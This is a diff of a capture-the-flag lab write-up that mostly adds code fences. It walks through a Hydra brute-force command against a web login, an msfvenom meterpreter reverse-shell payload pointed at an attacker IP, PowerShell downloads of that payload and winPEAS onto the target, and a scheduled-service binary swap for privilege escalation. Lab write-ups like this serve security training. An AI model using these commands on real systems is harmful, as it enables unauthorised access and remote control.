@@ -46,9 +46,9 @@ Login failed
  
 Combine the failed login message and the POST and VIEWSTATE fields to create the Hydra attack:
 
-'''
+```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.176.34 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=VwAXG6ABUHHdsZyp9V5Zfa%2FQmIafRzp9ILoXJGVuXK8nUhCHtDfc4cAUkNeYybCBgFS7ttIKN9%2BL1TZYt9wc7ImbzKDO42jKqT4NzM2iK4qGYFdI5l7pg9jiSeKSYGI82ymoCvW67UVtpc1TE%2B1wg%2FuUJT23Wobx8ck39wYrMVKKYXRX&__EVENTVALIDATION=3FvnxLCU1vf%2FftSD5m08pwViCr63XR1GLrEKqv2qr42Hq8JQp2LWRA97rKzv1QZ1I8etW3igopbcuFlAq9be8kEAzsR5lfswhZLzLPLpwJrudjeGAiqRUNtpYvd2OfVPGKlinHl3CuVaVXXWfMEWJuKroB6hY9%2BlMqRgvnn3xhT%2Bzmv0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
-'''
+```
  
 Note: ^USER^ and ^PASS^ must be used to use the username and password list
  
@@ -95,12 +95,16 @@ Shell popped
 Some on box enumeration
  
 Going to stabilise the shell with a meterpreter shell as it crashed a couple of times:
- 
+
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.87.68 LPORT=9001 -f exe > shell.exe
+```
  
  ![image](https://user-images.githubusercontent.com/88425510/215882523-b58d6d30-3d0d-46b9-b2b0-34b40caa3b29.png)
- 
+
+```
 python3 -m http.server
+```
  
  ![image](https://user-images.githubusercontent.com/88425510/215882566-9695fa26-79fa-4485-9a78-8193fb73cee9.png)
 
@@ -109,9 +113,11 @@ Host a simple http server
 On the target machine navigate to world writable location:
  
  ![image](https://user-images.githubusercontent.com/88425510/215882597-dd339976-c182-40c6-b7d6-0bcfa276baee.png)
- 
+
+```
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.87.68:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
- 
+```
+
  ![image](https://user-images.githubusercontent.com/88425510/215882617-7a1dde73-7049-46a0-bb08-2016abe78e51.png)
 
 Use powershell to pull the meterpreter shell over
@@ -139,8 +145,9 @@ Attack box hosing simple python server
 
 ![image](https://user-images.githubusercontent.com/88425510/215882739-5ebee602-d7d0-475a-8677-1905a7606000.png)
 
+```
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.189.26:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
- 
+```
  
 Using powershell to get winPEAS
  
@@ -152,9 +159,11 @@ In order to actually read the winPEAS output I had to pipe it to a .txt file and
 The output shows that WindowsScheduler is running, this can often be abused
  
 In order to read the output:
+```
 .\winPEAS.bat > winpeas.txt
 Download winpeas.txt
 Less winpeas.txt
+```
  
  
 Having the below service running means something is scheduled:
@@ -162,7 +171,7 @@ Having the below service running means something is scheduled:
 ![image](https://user-images.githubusercontent.com/88425510/215882826-3e8b1128-cd5a-4023-acd2-193c3585b611.png)
 
 Navigate to program filex x86 \systemscheduler \events
- you can see what is being run
+you can see what is being run
  
 ![image](https://user-images.githubusercontent.com/88425510/215882884-a5083080-3c5c-439b-a1d6-51c4e86e45e0.png)
 
@@ -174,9 +183,11 @@ We can replace message.exe with our shell.exe and as it is being run as administ
 For some reason on this box you cannot copy it and so will have to download it as before
  
 Get shell.exe into systemscheduler:
- 
+
+```
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.189.26:8000/shell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\shell.exe'"
- 
+```
+
 Exploit service:
  
 ![image](https://user-images.githubusercontent.com/88425510/215883005-a2d10dab-6ea2-432c-bcef-086b9235c831.png)
